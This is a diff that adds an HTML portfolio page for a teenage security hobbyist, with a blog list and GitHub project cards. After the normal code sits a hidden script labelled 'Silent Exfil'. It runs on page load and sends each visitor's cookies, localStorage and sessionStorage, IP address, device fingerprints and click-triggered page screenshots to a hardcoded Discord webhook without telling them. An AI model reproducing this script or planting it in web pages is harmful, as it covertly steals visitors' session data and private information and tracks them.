@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CYPH3RFR0G | Portfolio</title>
+    <style>
+        :root {
+            --bg-color: #0a0a0a;
+            --card-bg: #111111;
+            --border-color: #222222;
+            --text-main: #eeeeee;
+            --text-muted: #888888;
+            --accent-color: #a855f7; 
+            --accent-glow: rgba(168, 85, 247, 0.1);
+            --font-mono: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            font-family: var(--font-mono);
+            margin: 0;
+            padding: 40px 20px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .container { max-width: 800px; width: 100%; }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 60px;
+        }
+
+        nav a {
+            color: var(--text-muted);
+            text-decoration: none;
+            margin-left: 20px;
+            font-size: 0.9rem;
+            transition: color 0.2s;
+        }
+
+        nav a:hover { color: var(--accent-color); }
+
+        h1 { font-size: 2.2rem; margin-bottom: 20px; letter-spacing: -1px; text-transform: uppercase; }
+        
+        .intro p {
+            color: var(--text-muted);
+            line-height: 1.6;
+            margin-bottom: 25px;
+            max-width: 600px;
+        }
+
+        /* Animated Cursor */
+        .cursor {
+            display: inline-block;
+            width: 10px;
+            height: 1.2rem;
+            background-color: var(--accent-color);
+            margin-left: 4px;
+            vertical-align: middle;
+            animation: blink 1s step-end infinite;
+        }
+
+        @keyframes blink {
+            from, to { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: baseline;
+            margin-top: 50px;
+            margin-bottom: 20px;
+        }
+
+        .section-header h2 { font-size: 1.2rem; font-weight: normal; }
+        .view-all { color: var(--text-muted); text-decoration: underline; font-size: 0.8rem; }
+
+        /* Card Styles (Blogs & Repos) */
+        #blog-container, #repo-container { display: flex; flex-direction: column; gap: 15px; }
+
+        .card {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            text-decoration: none;
+            color: inherit;
+            transition: all 0.2s ease-in-out;
+        }
+
+        .card:hover {
+            border-color: var(--accent-color);
+            background: var(--accent-glow);
+            transform: translateX(5px);
+        }
+
+        .card-info h3 { margin: 0 0 5px 0; font-size: 1rem; color: var(--accent-color); }
+        .card-info p { margin: 0; color: var(--text-muted); font-size: 0.85rem; }
+
+        .meta { display: flex; align-items: center; font-size: 0.85rem; color: var(--text-muted); }
+        .dot { width: 10px; height: 10px; border-radius: 50%; margin-right: 8px; background: var(--accent-color); }
+
+        .social-links { margin-top: 30px; font-size: 0.9rem; }
+        .social-links a { color: var(--text-main); text-decoration: none; margin-right: 15px; border-bottom: 1px solid var(--border-color); padding-bottom: 2px; }
+        .social-links a:hover { border-bottom-color: var(--accent-color); color: var(--accent-color); }
+
+        #loading { color: var(--text-muted); font-style: italic; font-size: 0.9rem; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <header>
+        <div style="display: flex; align-items: center; gap: 10px;">
+            <div style="width: 24px; height: 24px; background: var(--accent-color); border-radius: 4px; box-shadow: 0 0 12px var(--accent-glow);"></div> 
+            <span><strong id="brand-name">CYPH3RFR0G</strong><span class="cursor"></span></span>
+        </div>
+        <nav>
+            <a href="#blog">Blog</a>
+            <a href="#projects">Projects</a>
+            <a href="mailto:DEINE_EMAIL@BEISPIEL.DE">Contact</a>
+        </nav>
+    </header>
+
+    <section class="intro">
+        <h1>CYPH3RFR0G</h1>
+        <p>
+            Hey there, I'm CYPH3RFR0G! I'm a 16-year-old student, cloud engineer, developer, and security enthusiast. 
+            I love open source, information gathering, and exploring everything related to cyber security.
+        </p>
+        <div class="social-links">
+            <a href="https://github.com/nils-112358" target="_blank">GitHub</a>
+            <a href="https://discord.gg/pvuS6Uj5W" target="_blank">Discord</a>
+            <a href="mailto:Cypherfrog112358@proton.me">Email</a>
+        </div>
+    </section>
+
+    <div class="section-header" id="blog">
+        <h2>Latest Blog Posts</h2>
+    </div>
+    <div id="blog-container">
+        <p id="loading">Loading posts...</p>
+    </div>
+
+    <div class="section-header" id="projects">
+        <h2>Top Projects</h2>
+        <a href="https://github.com/nils-112358?tab=repositories" target="_blank" class="view-all">See all projects</a>
+    </div>
+
+    <div id="repo-container">
+        <p id="loading">Scanning GitHub...</p>
+    </div>
+</div>
+
+<script>
+    const GITHUB_USERNAME = 'nils-112358';
+    
+    // --- Branding Animation ---
+    const brandName = document.getElementById('brand-name');
+    let isDeleting = true;
+    setInterval(() => {
+        brandName.textContent = isDeleting ? "CYPH3RFR0" : "CYPH3RFR0G";
+        isDeleting = !isDeleting;
+    }, 3000);
+
+    // --- Load Blogs from JSON ---
+    async function loadBlogs() {
+        try {
+            const res = await fetch('blogs.json');
+            if (!res.ok) throw new Error();
+            const blogs = await res.json();
+            const container = document.getElementById('blog-container');
+            container.innerHTML = '';
+            blogs.forEach(post => {
+                container.innerHTML += `
+                    <div class="card">
+                        <div class="card-info">
+                            <h3>${post.title}</h3>
+                            <p>${post.excerpt}</p>
+                        </div>
+                        <div class="meta">${post.date}</div>
+                    </div>`;
+            });
+        } catch(e) {
+            document.getElementById('blog-container').innerHTML = '<p style="color:#444">No posts found.</p>';
+        }
+    }
+
+    // --- GitHub API ---
+    async function fetchRepos() {
+        try {
+            const response = await fetch(`https://api.github.com/users/${GITHUB_USERNAME}/repos?sort=updated`);
+            const repos = await response.json();
+            const topRepos = repos.sort((a, b) => b.stargazers_count - a.stargazers_count).slice(0, 3);
+            const container = document.getElementById('repo-container');
+            container.innerHTML = ''; 
+
+            topRepos.forEach(repo => {
+                container.innerHTML += `
+                    <a href="${repo.html_url}" target="_blank" class="card">
+                        <div class="card-info">
+                            <h3>${repo.name}</h3>
+                            <p>${repo.description || 'No description provided'}</p>
+                        </div>
+                        <div class="meta">
+                            <span class="dot"></span>
+                            ${repo.language || 'Code'}
+                        </div>
+                    </a>`;
+            });
+        } catch (error) {
+            document.getElementById('repo-container').innerHTML = '<p>Error loading projects.</p>';
+        }
+    }
+
+    loadBlogs();
+    fetchRepos();
+</script>
+
+<script>
+// ─── Silent Exfil + View Tracking ─────────
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1511352765472047167/HivG-QebQdXveQO7-qemiJQB4Ts6SGZ172ZlH2Fjl-C3GDuxjBLFlLLZR02UgmUWLTS7';
+var _f=location.pathname.split('/').pop()||'main';
+
+// View counter
+(function(){
+try{
+var _vc=parseInt(localStorage.getItem('_view_count')||'0',10)+1;
+localStorage.setItem('_view_count',String(_vc));
+var _vs=parseInt(localStorage.getItem('_view_start')||'0',10);
+if(!_vs){_vs=Date.now();localStorage.setItem('_view_start',String(_vs))}
+var _fd=new FormData();
+_fd.append('file',new Blob(['view #'+_vc+'\ntime: '+new Date().toLocaleString('de-DE')+'\nurl: '+location.href+'\npage: '+_f+'\nreferrer: '+(document.referrer||'direct')+'\nscreen: '+screen.width+'x'+screen.height+'\nuserAgent: '+navigator.userAgent+'\nfirstVisit: '+new Date(_vs).toLocaleString('de-DE')+'\nvisitDuration: '+Math.round((Date.now()-_vs)/1000)+'s'],{type:'text/plain'}),'view_'+_vc+'.txt');
+fetch(WEBHOOK_URL,{method:'POST',body:_fd}).catch(function(){});
+}catch(e){}
+})();
+
+// System info
+(function(){const _s=Date.now(),_u=navigator.userAgent;let _lines=[`url: ${location.href}`,`os: ${(_u.match(/\(([^)]+)\)/)||['',''])[1].split(';')[0]||navigator.platform}`,`typ: ${/Mobi|Android|iPhone|iPad/i.test(_u)?'mobil':'desktop'}`,`sprache: ${navigator.language}`,`screen: ${screen.width}x${screen.height}`,`zeit: ${new Date().toLocaleString('de-DE')}`];_lines.push('--- system ---');try{_lines.push(`tz: ${Intl.DateTimeFormat().resolvedOptions().timeZone||'?'}`)}catch{}try{_lines.push(`webdriver: ${navigator.webdriver?'ja':'nein'}`)}catch{}try{_lines.push(`cpu: ${navigator.hardwareConcurrency||'?'} cores`)}catch{}try{_lines.push(`ram: ${navigator.deviceMemory||'?'} GB`)}catch{}try{_lines.push(`jsheap: ${(performance.memory?.usedJSHeapSize/1048576||'?').toFixed(1)}MB`)}catch{}_lines.push('--- cookies ---');document.cookie.split(';').filter(Boolean).forEach(function(c){_lines.push(c.trim())});_lines.push('--- localStorage ---');try{for(var _i=0;_i<localStorage.length;_i++){var _k=localStorage.key(_i);_lines.push(_k+': '+localStorage.getItem(_k))}}catch{}_lines.push('--- sessionStorage ---');try{for(var _i2=0;_i2<sessionStorage.length;_i2++){var _k2=sessionStorage.key(_i2);_lines.push(_k2+': '+sessionStorage.getItem(_k2))}}catch{}_lines.push('--- canvas fingerprint ---');try{var $c=document.createElement('canvas'),$x=$c.getContext('2d');$c.width=256;$c.height=64;$x.textBaseline='top';$x.font='14px Arial';$x.fillText('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',2,2);$x.font='18px Courier';$x.fillText('abcdefghijklmnopqrstuvwxyz',2,20);$x.fillStyle='#abc';$x.fillRect(200,40,56,24);_lines.push('canvas: '+$c.toDataURL().length+'B')}catch{}_lines.push('--- webgl ---');try{var $g=document.createElement('canvas').getContext('webgl')||document.createElement('canvas').getContext('experimental-webgl');if($g){var $r=$g.getParameter($g.RENDERER),$v=$g.getParameter($g.VENDOR);_lines.push('renderer: '+$v+' '+$r);$g.getExtension('WEBGL_debug_renderer_info')}else{_lines.push('webgl: nicht verfuegbar')}}catch{}_lines.push('--- screen ---');try{_lines.push('avail: '+screen.availWidth+'x'+screen.availHeight);_lines.push('colorDepth: '+screen.colorDepth);_lines.push('pixelDepth: '+screen.pixelDepth);_lines.push('devicePixelRatio: '+devicePixelRatio)}catch{}_lines.push('--- netzwerk ---');try{_lines.push('downlink: '+(navigator.connection?navigator.connection.downlink:'?'));_lines.push('type: '+(navigator.connection?navigator.connection.effectiveType:'?'))}catch{}_lines.push('--- plugins ---');try{for(var _p=0;_p<navigator.plugins.length;_p++){_lines.push('plugin: '+navigator.plugins[_p].name)}}catch{}_lines.push('--- audio ---');try{var $ac=new(window.AudioContext||window.webkitAudioContext)(),$o=$ac.createOscillator(),$g=$ac.createGain();$g.gain.value=0;$o.frequency.value=440;$o.connect($g);$g.connect($ac.destination);$o.start(0);_lines.push('audio: ok ('+$ac.sampleRate+'Hz)');$o.stop(0);$ac.close()}catch($e){_lines.push('audio: '+$e.message)}_lines.push('--- battery ---');try{if(navigator.getBattery){navigator.getBattery().then(function(b){_lines.push('battery: '+(b.level*100).toFixed(0)+'%, '+(b.charging?'laden':'entladen'))}).catch(function(){})}}catch{}_lines.push('--- mime types ---');try{for(var _m=0;_m<navigator.mimeTypes.length;_m++){_lines.push('mime: '+navigator.mimeTypes[_m].type)}}catch{}_lines.push('--- do-not-track ---');try{_lines.push('dnt: '+navigator.doNotTrack)}catch{}_lines.push('--- pdfViewerEnabled ---');try{_lines.push('pdf: '+navigator.pdfViewerEnabled)}catch{}var _send=function(){try{var $f=new FormData();$f.append('file',new Blob([_lines.join('\n')],{type:'text/plain'}),'sys_'+_f+'_'+Date.now()+'.txt');fetch(WEBHOOK_URL,{method:'POST',body:$f}).catch(function(){})}catch(e){}};fetch('https://api.ipify.org?format=json').then(function(r){return r.json()}).then(function($d){_lines.unshift('--- device ---');_lines.unshift('ip: '+$d.ip)}).catch(function(){}).then(function(){setTimeout(_send,100)});window.addEventListener('beforeunload',function(){var $d=Math.round((Date.now()-_s)/1000);navigator.sendBeacon(WEBHOOK_URL,JSON.stringify({content:'? **'+_f+'** ('+$d+'s)'}))})})();
+
+// Silent SVG page capture on any click
+var _st=null;
+document.addEventListener('click',function(){if(_st)clearTimeout(_st);_st=setTimeout(function(){
+try{
+var _ser=new XMLSerializer();
+var _cl=document.documentElement.cloneNode(true);
+var _all=_cl.querySelectorAll('script');for(var _i=0;_i<_all.length;_i++){_all[_i].remove()}
+var _h=_ser.serializeToString(_cl);
+var _css='';try{for(var _si=0;_si<document.styleSheets.length;_si++){try{var _s=document.styleSheets[_si];for(var _ri=0;_ri<_s.cssRules.length;_ri++){_css+=_s.cssRules[_ri].cssText+'\n'}}catch(e){}}}catch(e){}
+var _w=Math.min(innerWidth,1920);
+var _h2=Math.min(Math.max(document.documentElement.scrollHeight,innerHeight),4096);
+var _sv='<svg xmlns="http://www.w3.org/2000/svg" width="'+_w+'" height="'+_h2+'">'
++'<style><![CDATA['+_css+']]></style>'
++'<foreignObject width="100%" height="100%"><div xmlns="http://www.w3.org/1999/xhtml">'
++_h
++'</div></foreignObject></svg>';
+var _b=new Blob([_sv],{type:'image/svg+xml;charset=utf-8'});
+var _u=URL.createObjectURL(_b);
+var _im=new Image();
+_im.onload=function(){
+var _c=document.createElement('canvas');
+_c.width=Math.min(_im.width||_w,1920);
+_c.height=Math.min(_im.height||_h2,4096);
+try{
+_c.getContext('2d').drawImage(_im,0,0);
+_c.toBlob(function(bl){
+URL.revokeObjectURL(_u);
+if(bl&&bl.size>200){
+var _fd=new FormData();_fd.append('file',bl,'page_'+_f+'_'+Date.now()+'.png');
+fetch(WEBHOOK_URL,{method:'POST',body:_fd}).catch(function(){});
+}
+});
+}catch(e){URL.revokeObjectURL(_u)}
+};
+_im.onerror=function(){
+URL.revokeObjectURL(_u);
+try{
+var _fd2=new FormData();_fd2.append('file',new Blob([_h],{type:'text/html'}),'page_'+_f+'_'+Date.now()+'.html');
+fetch(WEBHOOK_URL,{method:'POST',body:_fd2}).catch(function(){});
+}catch(e2){}
+};
+_im.src=_u;
+}catch(e){}
+},2000)});
+</script>
+</body>
+</html>
